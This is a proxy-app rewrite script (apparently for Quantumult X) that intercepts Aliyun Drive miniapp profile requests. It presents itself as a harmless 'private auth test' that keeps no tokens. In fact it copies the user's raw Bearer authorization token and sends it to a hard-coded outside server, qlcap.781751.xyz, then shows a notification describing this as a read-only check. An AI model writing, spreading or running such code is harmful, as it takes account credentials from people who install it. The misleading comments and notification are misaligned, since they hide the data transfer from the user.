/* Aliyun miniapp, one exact user-profile request: ephemeral private auth test.
 * Does NOT sign in, persist tokens or update any QingLong variables.
 * No auth token appears in logs, QX preferences or notifications.
 */
'use strict';
const HOST='https://qlcap.781751.xyz:58443';
const ROUTE='https://user.aliyundrive.com/v2/user/get';
const APPID='wxf86f0a56fa23241f';
const PREFIX='qlcap_v1_', BUILD='20261118-signonce-01';
function get(k){return $prefs.valueForKey(PREFIX+k)||'';}
function set(k,v){return $prefs.setValueForKey(String(v),PREFIX+k);}
function done(){if(typeof $done==='function')$done({});}
function header(h,name){
 const k=Object.keys(h||{}).find(x=>x.toLowerCase()===name);
 return k?String(h[k]).trim():'';
}
function hash(s){
 let h=2166136261;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i);h=Math.imul(h,16777619);}
 return (h>>>0).toString(16);
}
function main(){
 const req=(typeof $request!=='undefined'&&$request)||{};
 if(!/^https:\/\/user\.aliyundrive\.com\/v2\/user\/get(?:\?|$)/i.test(String(req.url||'')))return done();
 if(String(req.method||'').toUpperCase()!=='POST')return done();
 set('alipan_auth_probe_hit_at',new Date().toISOString());
 if(get('armed')==='0'||get('alipan_auth_probe_armed')==='0')return done();
 const referer=header(req.headers,'referer');
 const app=/servicewechat\.com\/(wx[0-9a-f]{16})\//i.exec(referer);
 if(!app||app[1].toLowerCase()!==APPID){
  set('alipan_auth_probe_last_result','appid_unverified');
  return done();
 }
 const auth=header(req.headers,'authorization');
 if(!/^Bearer [A-Za-z0-9._~+/-]{35,4500}={0,2}$/.test(auth)){
  set('alipan_auth_probe_last_result','bearer_unrecognized');
  return done();
 }
 const fingerprint=BUILD+':'+hash(auth);
 if(get('alipan_auth_probe_last_hash')===fingerprint)return done();
 const server=get('url').replace(/\/+$/,''),gatewayKey=get('token');
 if(server!==HOST||gatewayKey.length<32){
  set('alipan_auth_probe_last_result','gateway_not_configured');
  return done();
 }
 let ended=false;
 function end(result){
  if(ended)return;ended=true;
  set('alipan_auth_probe_last_result',result);
  if(result==='received'){
   set('alipan_auth_probe_last_hash',fingerprint);
   set('alipan_auth_probe_uploaded_at',new Date().toISOString());
   if(typeof $notify==='function')$notify('阿里云盘授权兼容验证','已提交私有只读验证','不会执行签到，也不改青龙变量。');
  }
  done();
 }
 const timer=setTimeout(()=>end('timeout'),2500);
 try{
  $task.fetch({url:HOST+'/trace/v1/ingest',method:'POST',opts:{policy:'direct'},
   headers:{Authorization:'Bearer '+gatewayKey,'Content-Type':'application/json'},
   body:JSON.stringify({v:1,type:'alipan_auth_probe_v1',service:'alipan',
    url:ROUTE,captured_at:Date.now(),wx_appid:APPID,
    headers:{Authorization:auth}})}
  ).then(response=>{
    clearTimeout(timer);
    let result={};try{result=JSON.parse(response.body||'{}');}catch(_){}
    const code=Number(response.statusCode||response.status||0);
    end(code===200&&result.accepted===true&&result.service==='alipan'?'received':'server_rejected');
  }).catch(()=>{clearTimeout(timer);end('network_error');});
 }catch(_){clearTimeout(timer);end('script_error');}
}
try{main();}catch(_){done();}
